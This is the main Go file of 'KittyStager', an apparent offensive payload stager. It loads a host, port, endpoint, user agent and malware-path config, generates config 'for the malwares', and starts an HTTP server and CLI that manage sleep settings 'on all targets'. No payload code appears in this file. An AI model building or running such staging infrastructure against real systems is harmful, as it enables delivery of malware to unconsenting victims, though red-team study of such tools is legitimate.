/*
Copyright © 2022 Enelg
*/
package main

import (
	"GoStager/cmd/cli"
	"GoStager/cmd/config"
	"GoStager/cmd/http"
	"GoStager/cmd/util"
	"errors"
	"fmt"
	color "github.com/logrusorgru/aurora"
)

func main() {
	fmt.Println(color.Cyan("                     _\n                    / )\n                   ( (\n     A.-.A  .-\"\"-.  ) )\n    / , , \\/      \\/ /\n   =\\  t  ;=    /   /\n     `--,'  .\"\"|   /\n         || |  \\\\ \\\n        ((,_|  ((,_\\\n"))
	fmt.Println(color.Cyan("KittyStager - A simple stager written in Go\n"))
	conf, err := config.GetConfig()
	if err != nil {
		util.ErrPrint(err)
	}
	//check config
	if conf.GetHost() == "" || conf.GetPort() == 0 || conf.GetEndpoint() == "" || conf.GetUserAgent() == "" || conf.GetMalPath() == nil {
		util.ErrPrint(errors.New("please check your config file"))
		return
	}
	fmt.Println(color.Green("[+] Config loaded"))
	//generate config file for the malwares
	err = util.GenerateConfig(conf)
	if err != nil {
		util.ErrPrint(err)
		return
	}
	fmt.Println(color.Green("[+] Config file generated"))
	fmt.Println(color.Green("[+] Starting http server"))
	fmt.Printf("%s %d%s %s %s\n", color.Green("[+] Sleep set to"), color.Yellow(conf.GetSleep()), color.Yellow("s"), color.Green("on"), color.Yellow("all targets"))
	go http.CreateHttpServer(conf)
	err = cli.Cli(conf)
	if err != nil {
		util.ErrPrint(err)
	}
}
